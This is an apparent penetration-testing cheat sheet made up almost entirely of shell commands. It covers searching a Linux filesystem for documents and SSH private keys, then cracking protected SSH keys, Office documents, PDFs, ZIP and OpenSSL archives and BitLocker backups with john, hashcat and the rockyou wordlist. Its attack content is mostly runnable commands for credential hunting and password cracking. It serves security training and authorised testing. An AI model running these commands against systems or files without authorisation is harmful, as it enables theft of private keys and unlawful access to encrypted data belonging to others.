
```bash
# hunting for files
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

# hunting for ssh keys
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

# encrypted ssh keys
cat /home/cry0l1t3/.ssh/SSH.private
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
ssh2john.py SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
john ssh.hash --show
```
## Cracking documents
#### docs
```bash
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show
```
#### pdf
```bash
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show
```
#### archives
Get list of extensions:
```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```
Zip:
```bash
zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash 
```
OpenSSl encrypted archives:
```bash
file GZIP.gzip 

GZIP.gzip: openssl encd data with salted password

# dictionary attack
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done

ls
```
#### bitlocker
Brute-force recovery key of 48-digits.
```bash
bitlocker2john -i Backup.vhd > backup.hashes
grep "bitlocker\$0" backup.hashes > backup.hash

hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked

cat backup.cracked 
```
